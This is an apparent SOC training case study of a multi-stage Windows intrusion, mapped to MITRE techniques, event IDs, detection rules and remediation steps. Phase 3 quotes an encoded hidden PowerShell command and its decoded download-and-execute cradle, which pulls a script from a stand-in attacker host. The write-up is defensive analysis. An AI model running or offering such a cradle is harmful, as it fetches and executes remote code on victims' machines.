# SOC Case Study 001: Windows Enterprise Multi-Stage Intrusion

## Executive Summary
This case study documents an end-to-end incident investigation recreating a multi-stage intrusion against an enterprise Windows endpoint. The adversary progressed from initial credential guessing against remote desktop services to establishing persistence via backdoor account provisioning, culminating in an in-memory encoded PowerShell execution cradle.

---

## Intrusion Timeline and Kill Chain Mapping

| Time (UTC) | Kill Chain Phase | MITRE ATT&CK | Observed Activity | Event Telemetry |
| :--- | :--- | :--- | :--- | :--- |
| 15:00:10 | Credential Access | T1110.001 | RDP password guessing against Administrator | Event ID 4625 (LogonType 10, SubStatus 0xC000006A) |
| 15:05:30 | Persistence | T1136.001 | Local backdoor account `backdoor_root` provisioned | Event ID 4720 (TargetUserName: backdoor_root) |
| 15:08:15 | Execution & Evasion | T1059.001, T1027 | Hidden, encoded PowerShell payload cradle launched | Event ID 4688 (CommandLine contains `-enc` and `-w hidden`) |

---

## Detailed Technical Analysis

### Phase 1: Remote Credential Access
- **Source IP:** `203.0.113.55` (Untrusted external infrastructure)
- **Target Account:** `administrator`
- **Detection Trigger:** Rule `d7e8b91a-4c2f-4a3b-9801-6f23d5a49811` (Potential Windows Authentication Brute-Force)
- **Telemetry Indicators:** Event ID 4625 indicated multiple failed attempts with SubStatus `0xC000006A` across Logon Type 10 (RemoteInteractive).
- **Analyst Action:** Immediate geo-location and reputation query on IP `203.0.113.55`.

### Phase 2: Local Persistence Establishment
- **Target Account Created:** `backdoor_root`
- **Creator Context:** `administrator`
- **Detection Trigger:** Rule `b4a2c918-1e5f-4a3d-8210-9f5b3c4d7e21` (Suspicious Local or Domain Account Creation)
- **Telemetry Indicators:** Event ID 4720 generated outside of scheduled HR or IT onboarding windows with no corresponding change ticket.
- **Analyst Action:** Queried Event 4728 and 4732 to evaluate whether `backdoor_root` was added to `BUILTIN\Administrators`.

### Phase 3: In-Memory Payload Execution
- **Process:** `powershell.exe` spawned from `cmd.exe`
- **User:** `backdoor_root`
- **Command Line:** `powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0...`
- **Deobfuscated Command:** `IEX (New-Object Net.WebClient).DownloadString('https://malicious.site/b.ps1')`
- **Detection Trigger:** Rule `a8b1c2d3-e4f5-4678-90ab-cdef12345678` (Suspicious Encoded PowerShell Process Execution)
- **Analyst Action:** Extracted C2 domain `malicious.site`, blocked perimeter egress, and initiated host memory acquisition.

---

## SOC Containment and Remediation Checklist

1. **Host Isolation:** Isolated endpoint using EDR network quarantine.
2. **Perimeter Blocking:** Ingress drop rules applied for `203.0.113.55`; egress DNS sinkhole and IP block applied for `malicious.site`.
3. **Identity Remediation:**
   - Disabled account `backdoor_root` (`Disable-ADAccount` / `net user backdoor_root /active:no`).
   - Reset credentials for `administrator` and revoked all active Kerberos TGTs.
4. **Forensic Collection:** Collected memory dump, `$MFT`, `$LogFile`, and PowerShell Operational event log (Event ID 4104) to reconstruct downloaded stage-2 payload.
5. **Hardening:** Restricted internet-exposed RDP access behind VPN requiring multi-factor authentication.
